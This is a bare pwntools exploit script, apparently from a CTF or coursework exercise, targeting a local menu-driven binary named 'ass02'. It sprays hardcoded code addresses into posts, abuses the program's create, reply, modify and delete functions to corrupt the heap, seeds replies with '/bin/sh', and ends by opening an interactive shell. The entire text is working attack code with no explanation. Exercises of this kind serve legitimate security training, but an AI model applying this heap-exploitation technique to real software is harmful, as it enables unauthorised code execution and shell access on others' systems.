from pwn import *

def writePost(author,title,content):
	p.recv()
	p.sendline('1')
	p.recv()
	p.sendline(author)
	p.recv()
	p.sendline(title)
	p.recv()
	p.sendline(content)

def writeReply(idx,content):
	p.recv()
	p.sendline('2')
	p.recv()
	p.sendline(str(idx))
	p.recv()
	p.sendline('3')
	p.recv()
	p.sendline(content)
	p.recv()
	p.sendline('4')

def modifyPost(idx,author,title):
        p.recv()
        p.sendline('2')
        p.recv()
        p.sendline(str(idx))
        p.recv()
        p.sendline('2')
        p.recv()
        p.sendline(author)
        p.recv()
        p.sendline(title)
        p.recv()
        p.sendline('4')

def deletePost(idx):
        p.recv()
        p.sendline('2')
        p.recv()
        p.sendline(str(idx))
        p.recv()
        p.sendline('1')
        p.recv()
        p.sendline('4')

p = process('./ass02')

writePost("1","1","1")
writePost("2","2",p32(0x080487C4)*1000+p32(0x08048630)*1000)
writePost("3","3","3")
for i in range(0xff):
	writeReply(2,str(i))
deletePost(2)
writePost("4","4","4")
writePost("5","5","5")
for i in range(0xff):
        writeReply(4,"/bin/sh")
modifyPost(4,"aa","bb")
deletePost(4)



p.interactive()
